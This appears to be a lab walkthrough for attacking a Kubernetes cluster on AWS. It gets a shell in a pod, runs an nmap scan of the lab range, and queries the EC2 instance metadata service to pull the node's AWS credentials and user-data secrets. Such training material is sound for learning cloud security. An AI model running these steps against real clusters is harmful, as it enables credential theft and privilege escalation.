# First step within the cluster

- Start a new pod on the cluster: `kubectl create -f pod.yaml`
- Ensure the pod has been started: `kubectl get pod -n business-app`
- Once started, get an interactive shell on the pod: `kubectl exec my-pod -n business-app -it -- /bin/bash`

# Scanning the cluster

You can use `ip a` to get the IP adresse of your pod and identify the range to
scan.

```
nmap -sS -p 8080 {PLACEHOLDER_LAB_CIDR}
```

The command may take few minutes. Feel free to continue inside a new
`kubectl exec` process.


# Accessing the metadata/user API

## Instance metadata API

https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html

```shell
TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/
```

You can explore the metadata API and discover that you are considered to be
the EC2 instance the pod runs on. You can even get an AWS token with its
privileges

## User API

User API are script which are used to initialize the EC2. They may sometime
contain secret, even if it is unadvised.

https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-add-user-data.html

```shell
TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/user-data
```
